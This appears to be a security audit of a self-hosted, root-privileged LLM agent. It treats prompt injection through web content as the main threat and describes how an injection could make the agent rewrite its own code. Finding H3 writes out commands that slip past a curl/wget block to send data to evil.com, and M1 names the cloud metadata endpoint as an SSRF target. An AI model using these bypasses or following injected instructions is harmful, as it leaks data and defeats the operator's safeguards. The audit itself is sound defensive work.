# Security Assessment

## Architecture

```
nginx (public) → clawchat (:3100) → eliezer (:3200, localhost)
                                        ├→ SearXNG (:8080, localhost)
                                        └→ LLM API (external)
```

Port 3200 is local IPC between trusted services. External users never touch the agent API.
The agent runs as root on the host (systemd) with full exec/read/write access.

## Attack surface

The real threat is: **web content → vetting gate → LLM → tools**.
Everything else is trusted local communication.

## HIGH

### ~~H1: Vetting LLM truncates to 4000 chars~~ FIXED

Vetting now samples up to 50k chars (first 25k + last 25k for large content).
Auto-vet threshold raised from 500KB to 10MB. Only non-text blobs (images,
audio, databases) skip vetting — those are on the passthrough allowlist by design
and will go through user approval in the future.

### H2: Self-modification with no integrity check

A successful prompt injection can `write` to source files and `restart_self`.
One-shot persistent compromise. No signing, no diff, no rollback.
The vetting gate is the only defense, and it has the truncation gap above.

### H3: Exfiltration bypasses in exec tool

`tools.mts:73-77` blocks `curl`/`wget` by regex. Gate scripts block the binaries on the host.
But the agent can still reach external URLs via:
- `python3 -c "import urllib.request; ..."`
- `node -e "fetch('https://evil.com')"`
- `apt-get install netcat && nc evil.com 80`

These bypass both the regex and the gate scripts.

## MEDIUM

### M1: SSRF via wget_tool

`tools.mts:169` — wget_tool follows redirects and accepts any URL. No URL blocklist.
A prompt injection could make the agent fetch `http://169.254.169.254/latest/meta-data/`
(cloud metadata) or probe internal services.

### M2: No file size check before read

`tools.mts:102` — `readFileSync` loads entire file into memory before the 20k char
truncation. Agent reads `/proc/kcore` or a multi-GB file → OOM. Not externally
triggerable, but prompt injection could cause it.

### M3: Compaction can lose safety constraints

Compaction LLM summarizes conversations. If user instructions ("never do X") get
compressed away, the agent loses them. memory.md distillation mitigates but doesn't
guarantee preservation.

## LOW

### L1: Error messages leak LLM base URL

`llm.mts:89` — errors sent to chat include the base URL. Not a secret,
but reveals infrastructure.

### L2: Database file permissions

`new Database(DB_PATH)` creates with default umask. On a shared system,
conversation history could be readable by other users.

### L3: Secret redaction timing

Tool input is logged (`eliezer.mts:329`) before redaction runs on output.
If the LLM echoes a secret in a tool argument, it hits the log unredacted.

## Defenses in place

- Secret redaction: pattern matching + entropy scoring (`detect-secret.mts`)
- Web search results fenced with random nonce
- Vetting LLM screens web content and downloads
- curl/wget blocked in exec regex + gate scripts on host
- Chat tool has path traversal protection (`chat.mts:61`)
- Tool output truncated to 20k chars
- Parameterized SQL everywhere (no string interpolation)
- SearXNG bound to localhost only
- `.env` gitignored, never in history
